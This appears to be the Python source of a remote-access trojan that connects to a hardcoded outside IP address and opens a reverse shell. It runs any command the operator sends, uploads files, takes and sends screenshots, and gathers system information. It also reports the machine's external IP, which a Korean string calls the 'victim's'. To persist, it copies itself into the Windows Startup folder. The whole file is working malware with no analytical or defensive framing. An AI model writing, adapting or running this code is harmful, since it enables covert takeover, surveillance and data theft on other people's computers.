import socket
import os
from PIL import ImageGrab
import time
import getpass
import requests
from bs4 import BeautifulSoup

def client():
    HOST = '1.250.9.24'
    PORT = 29584
    s = socket.socket()
    s.connect((HOST,PORT))
    print("커넥트")
    while True:
        s.sendall(os.getcwd().encode('utf-8'))
        data = s.recv(2048)
        data = data.decode('utf-8')
        print(data)
        if "cd " in data:
            os.chdir(data.replace('cd ',''))
            s.sendall("a".encode('utf-8'))

        elif "cd.." in data:
            path = os.getcwd()
            path = path.split("\\")
            del(path[len(path)-1])
            st = ''
            for i in path:
                st += i+"\\"
            os.chdir(st)
            s.sendall('a'.encode('utf-8'))

        elif " "==data:
            time.sleep(2)
            continue
        
        elif 'systeminfo' in data or 'sysinfo' in data:
            mm=os.popen('systeminfo').read().strip()
            ls = mm.splitlines()
            print(ls)
            st = ''
            print(st)
            ls = ls[:30]
            for i in ls:
                i.replace('\t','')
                st += i+"\n"
            s.sendall(st.encode('utf-8'))

        elif "upload" in data:
            count = 0
            ls = data.split(' ')
            name = ls[1]
            try:
                name2 = ls[2]
            except IndexError:
                name2 = 'copy_'+name
            f = open(name2,'wb')
            while True:
                cc = s.recv(2048)
                try:
                    cc = cc.decode('utf-8')
                except UnicodeDecodeError:
                    count+=1
                    f.write(cc)
                    print(cc)
                if cc == "end" or cc == data or cc==" ":
                    break
            f.close()
            byte = count * 2
            s.sendall(str(byte).encode('utf-8'))
        
        elif "ls" in data:
            mm = os.listdir()
            st = ''
            for i in mm:
                st += i+"       "
            s.sendall(st.encode('utf-8'))


        elif "screenshot" in data:
            img = ImageGrab.grab()
            img.save('img.jpg')
            f = open('img.jpg','rb')
            l = f.read(2048)
            while (l):
                s.send(l)
                print(l)
                l = f.read(2048)
            f.close()
            os.remove('img.jpg')
            time.sleep(2)
            s.sendall('end'.encode('utf-8'))

        elif "startmenu add" in data:
            c = 0
            print("메뉴실행")
            now_getcwd = os.getcwd()
            file_name = os.path.abspath(__file__)
            ls = file_name.split('\\')
            file_complete_name = "security.exe"
            path = 'C:\\Users'
            os.chdir('C:\\Users')
            ppath = getpass.getuser()
            ppath = "C:\\Users\\"+ppath
            b_path = ppath+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
            print(b_path)
            print(file_name,b_path)
            pp = os.popen('copy "'+file_name+'" "'+b_path+'"').read().strip()
            print(pp)
            os.chdir(now_getcwd)


        elif "startmenu del" in data:
            now_getcwd = os.getcwd()
            file_name = os.path.abspath(__file__)
            ls = file_name.split('\\')
            file_complete_name = ls[-1]
            path = 'C:\\Users'
            os.chdir('C:\\Users')
            ppath = getpass.getuser()
            ppath = "C:\\Users\\"+ppath
            b_path = ppath+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
            os.chdir(b_path)
            os.remove(file_complete_name)
            os.chdir(now_getcwd)

        elif "ip"==data:
            url = 'https://www.findip.kr/'
            html = requests.get(url).text
            soup = BeautifulSoup(html,"html.parser")
            site = soup.select("h2.w3-xxlarge")
            site = str(site)
            site = site.replace('[<h2 class="w3-xxlarge">내 아이피 주소(IP Address): ','')
            out_ip = site.replace('</h2>]','')
            st = "피해자의 외부 ip주소 : "+out_ip
            s.sendall(st.encode('utf-8'))


        else:
            mm = os.popen(data).read().strip()
            if len(mm)==0:
                bbbb = '은(는) 내부 또는 외부 명령, 실행할 수 있는 프로그램, 또는 배치 파일이 아닙니다.'
                mm = "'"+data+"'"+bbbb
            s.sendall(mm.encode('utf-8'))
            
        time.sleep(1)

client()